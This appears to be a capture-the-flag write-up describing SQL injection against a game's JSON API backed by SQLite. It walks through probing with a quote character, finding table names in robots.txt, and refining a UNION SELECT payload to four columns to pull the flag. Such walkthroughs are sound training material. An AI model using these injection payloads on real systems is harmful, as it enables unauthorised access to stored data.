# Examining Payload
When making a guess, it sends the information in a payload that is in the following JSON format:
```json
{
    "characters":"CHARACTER",
    "object":"OBJECT",
    "place":"PLACE"
}
```

# Breaking the Payload
We can then attempt to break this and see what results we get.

If we pass in the JSON:
```json
{"place":"\""}
```

We will get a SQL Lite error (remember to escape the character in order to keep it as a valid JSON). 

This means the site will probably be vulnerable to SQL injection.

# Recon for Usable Info
If we look at the robots.txt, we can see the following names of tables:
```
Disallow: /api/characters
Disallow: /api/objects
Disallow: /api/places
Disallow: /api/answer
Disallow: /api/flag
```

We can access all but `/api/answer` and `/api/flag` which tells us we do not have access to those tables.

# Crafting a Better Payload
We can then attempt to access the flag table by using a SQL `UNION` inject:
```json
{"place":"\" UNION SELECT flag from flag;"}
```

This gives us an error saying:
```
Error: SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result column
```

# Refining the Payload
This means that the tables are not the same size, we can then try modified injects by adding more columns.
```json
{"place":"\" UNION SELECT flag,flag,flag,flag from flag;"}
```

This will then output the flag. 